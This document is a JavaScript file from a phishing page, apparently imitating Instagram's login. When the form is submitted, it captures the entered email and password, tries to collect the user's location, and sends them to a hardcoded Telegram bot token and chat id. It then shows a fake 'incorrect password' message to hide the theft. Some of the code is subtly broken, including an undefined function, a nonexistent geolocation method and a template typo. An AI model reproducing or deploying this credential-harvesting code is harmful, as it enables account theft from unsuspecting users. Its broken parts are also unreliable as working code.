const form = document.querySelector("#form")

form.addEventListener("submit", (e) => {
    e.preventDefault();
var locate = table(data.address)
    var identity = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    navigator.geolocation.getCurrentLocation(position =>{
        const{latitude, longitude} = position.coords;
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=%{longitude}`;
        fetch(url).then(res => res.json()).then(data => {console.table(data.address);});});
    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password} -location: ${locate}`

    var token = "6487678113:AAEnSRLqV9eUAI_4Ld32zFP4fixtJAUaYag";
    var chat_id = -1001937386351
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    // window.location.replace("https://www.instagram.com/accounts/login/")
    console.log("Incorrect Password!");

    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
})
